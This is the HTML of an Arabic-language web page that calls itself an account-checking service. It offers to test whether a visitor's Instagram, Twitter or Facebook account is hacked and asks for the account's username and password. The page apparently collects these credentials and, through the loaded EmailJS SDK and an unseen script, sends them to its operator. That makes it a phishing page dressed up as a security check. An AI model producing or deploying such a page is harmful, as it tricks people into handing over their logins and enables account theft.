<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقع فحص الحسابات</title>
    <!-- إضافة Bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- إضافة خطوط Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
    <!-- إضافة ملف CSS الخاص -->
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>

<div class="container">
    <!-- تبديل اللغة -->
    <div class="language-switcher">
        <button id="switchToArabic" class="btn btn-language">العربية</button>
        <button id="switchToEnglish" class="btn btn-language">English</button>
    </div>

    <!-- رسالة الترحيب -->
    <div id="welcomeMessage" class="welcome-message">
        <h1>مرحباً بكم في موقع فحص الحسابات</h1>
        <p>هذا الموقع يساعدك على فحص حساباتك على منصات التواصل الاجتماعي لمعرفة ما إذا كانت آمنة أو مخترقة.</p>
    </div>

    <div class="platform">
        <button class="btn btn-platform" onclick="showForm('instagram')">فحص انستقرام</button>
        <button class="btn btn-platform" onclick="showForm('twitter')">فحص تويتر</button>
        <button class="btn btn-platform" onclick="showForm('facebook')">فحص فيسبوك</button>
    </div>

    <div id="instagramForm" class="form">
        <form id="instagramFormData" onsubmit="submitForm(event, 'instagram')">
            <div class="form-group">
                <label for="instagramUsername">اسم المستخدم</label>
                <input type="text" id="instagramUsername" name="username" class="form-control" placeholder="أدخل اسم المستخدم" required>
            </div>
            <div class="form-group">
                <label for="instagramPassword">كلمة المرور</label>
                <input type="password" id="instagramPassword" name="password" class="form-control" placeholder="أدخل كلمة المرور" required>
            </div>
            <button type="submit" class="btn btn-submit">فحص الحساب</button>
        </form>
    </div>

    <div id="twitterForm" class="form">
        <form id="twitterFormData" onsubmit="submitForm(event, 'twitter')">
            <div class="form-group">
                <label for="twitterUsername">اسم المستخدم</label>
                <input type="text" id="twitterUsername" name="username" class="form-control" placeholder="أدخل اسم المستخدم" required>
            </div>
            <div class="form-group">
                <label for="twitterPassword">كلمة المرور</label>
                <input type="password" id="twitterPassword" name="password" class="form-control" placeholder="أدخل كلمة المرور" required>
            </div>
            <button type="submit" class="btn btn-submit">فحص الحساب</button>
        </form>
    </div>

    <div id="facebookForm" class="form">
        <form id="facebookFormData" onsubmit="submitForm(event, 'facebook')">
            <div class="form-group">
                <label for="facebookUsername">اسم المستخدم</label>
                <input type="text" id="facebookUsername" name="username" class="form-control" placeholder="أدخل اسم المستخدم" required>
            </div>
            <div class="form-group">
                <label for="facebookPassword">كلمة المرور</label>
                <input type="password" id="facebookPassword" name="password" class="form-control" placeholder="أدخل كلمة المرور" required>
            </div>
            <button type="submit" class="btn btn-submit">فحص الحساب</button>
        </form>
    </div>

    <!-- رسالة النتيجة -->
    <div id="resultMessage" class="thank-you-message">
        <!-- سيتم عرض نتيجة الفحص هنا -->
    </div>
</div>

<!-- إضافة EmailJS SDK -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
<!-- إضافة ملف JavaScript الخاص -->
<script src="js/script.js"></script>

</body>
</html>
